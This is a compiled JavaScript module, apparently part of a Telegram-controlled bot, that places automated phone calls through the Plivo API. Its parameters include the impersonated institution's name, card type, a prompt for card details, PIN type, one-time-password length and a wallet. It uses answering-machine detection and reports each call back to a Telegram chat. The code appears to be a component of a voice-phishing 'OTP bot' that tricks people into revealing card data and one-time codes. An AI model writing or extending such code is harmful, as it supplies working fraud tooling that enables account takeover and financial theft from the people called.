"use strict";
var __awaiter = (this && this.__awaiter) || function(thisArg, _arguments, P, generator) {
  function adopt(value) { return value instanceof P ? value : new P(function(resolve) { resolve(value); }); }
  return new (P || (P = Promise))(function(resolve, reject) {
    function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
    function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
    function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
    step((generator = generator.apply(thisArg, _arguments || [])).next());
  });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.plivoMakeACall = exports.client = void 0;
const plivo_1 = require("plivo");
const __1 = require("..");
exports.client = new plivo_1.Client(process.env.PLIVO_AUTH_ID, process.env.PLIVO_AUTH_TOKEN);
const plivoMakeACall = ({ institutionName, to, from, step, wallet, cardType, askCardInfo, chatId, transferNumber, pinType, customMessage, actions, otpLength, }) => __awaiter(void 0, void 0, void 0, function*() {
  const language = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(to)
    ? 'en-GB'
    : 'en-US';
  exports.client.calls
    //.create(from, to, `${process.env.ENDPOINT_URL}/answer/${step}/${language}/?institutionName=${institutionName}&cardType=${cardType}&askCardInfo=${askCardInfo}&transferNumber=${transferNumber}&pinType=${pinType}&wallet=${wallet}&customMessage=${customMessage}&actions=${actions}&from=${from}&to=${to}&chatId=${chatId}&otpLength=${otpLength}`,
    .create(from, to, `${process.env.ENDPOINT_URL}/answer`,
      // `https://s3.amazonaws.com/static.plivo.com/answer.xml`,
      {
        callbackMethod: 'GET',
        ringUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        hangupUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        // callbackUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        machineDetectionUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        machineDetection: true,
      }
    )
    .then((response) => __awaiter(void 0, void 0, void 0, function*() {
      console.log('#', response);
      yield __1.bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
    }), (err) => __awaiter(void 0, void 0, void 0, function*() {
      var _a;
      console.error(err);
      yield __1.bot.telegram.sendMessage(chatId, `Something went wrong try again later.`);
      yield ((_a = __1.bot.context.scene) === null || _a === void 0 ? void 0 : _a.enter('super-wizard'));
    }));
});
exports.plivoMakeACall = plivoMakeACall;
